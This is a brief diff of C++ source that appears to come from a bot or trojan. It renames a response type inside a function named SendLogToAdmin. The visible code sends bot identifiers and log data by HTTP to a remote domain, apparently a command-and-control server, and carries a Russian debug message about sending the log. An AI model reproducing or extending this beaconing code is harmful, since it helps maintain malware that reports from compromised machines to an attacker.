@@ -210,7 +210,7 @@ static void SendLogToAdmin( int num, const char* text = 0 )
 	else
 		addText[0] = 0;
 	pwsprintfA( qr, "http://%s/raf/?uid=%s&sys=rafa&mode=setlog&log=%d%s", domain, BOT_UID, num, addText );
-	THTTPResponse Response;
+	THTTPResponseRec Response;
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
 	DBGRAFA( "Rafa", "Отсылка лога: %s", qr );
